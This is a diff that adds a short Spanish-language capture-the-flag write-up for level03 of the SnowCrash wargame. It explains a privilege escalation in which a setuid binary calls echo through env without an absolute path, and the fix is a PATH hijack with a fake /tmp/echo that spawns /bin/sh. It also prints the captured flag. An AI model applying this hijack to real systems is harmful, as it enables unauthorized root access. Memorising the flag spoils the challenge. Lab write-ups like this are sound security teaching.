@@ -1,0 +1,39 @@
+level03:
+
+
+	al ejecturar el binario sale el mensaje :
+
+	"Exploit me".
+
+	usando string en el binario hay una linea interesante:
+
+	/usr/bin/env echo Exploit me
+
+	no esta usando la ruta absoluta de echo que seria:
+
+	/bin/echo
+
+	asi que se puede escalar privilegios, nos dirigimos  a tmp a crear un sript malicioso:
+
+	y creo un script que despues de modificar el PATH haremos que ejecute un echo, pero no el original si no
+	el mio dentro de tmp/, este mirara la ruta por que yo la modificaré con: 
+	
+	export PATH=/tmp:$PATH
+	level03@SnowCrash:~$ printenv PATH
+
+	y mi escript de escala que será:
+
+	echo '#!bin/sh' > /tmp/echo
+
+	echo '/bin/sh' >> /tmp/echo
+
+	chmod +x /tmp/echo
+
+	
+	y ¡Bingo!, al ejecutar de nuevo el script llamado level03 que llamaba mal a echo, se ejecuta una shell, se ejecuta
+	el getflag y flag conseguida:
+
+	qi0maab88jeaj46qoumi7maus
+
+
+
